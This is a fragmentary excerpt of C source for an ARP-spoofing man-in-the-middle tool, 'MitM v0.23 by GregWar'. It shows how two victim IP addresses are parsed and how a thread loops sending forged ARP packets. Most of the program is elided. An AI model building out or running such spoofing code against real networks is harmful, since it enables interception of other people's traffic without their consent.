...
int main(int argc, char *argv[]) {
    ...
    c=sscanf(argv[optind],"%d.%d.%d.%d",&tmp_ip[0],&tmp_ip[1],&tmp_ip[2],&tmp_ip[3]);
    for (i=0; i<0x4; i++) victimA.ip[i] = tmp_ip[i];
    c=sscanf(argv[optind+1],"%d.%d.%d.%d",&tmp_ip[0],&tmp_ip[1],&tmp_ip[2],&tmp_ip[3]);
    for (i=0; i<0x4; i++) victimB.ip[i] = tmp_ip[i];
...
void mitm_usage() {
    fprintf(stderr, "MitM v0.23 by GregWar\n"
...
void *mitm_ARP_spoofer(void*d) {
    ...
    while (mitm_running) {
        sendto(sock,(unsigned char*)&pckt,sizeof(struct arp_packet),0,(struct sockaddr*)&addr,sizeof(struct sockaddr_ll));
        sleep(0x1);
    }
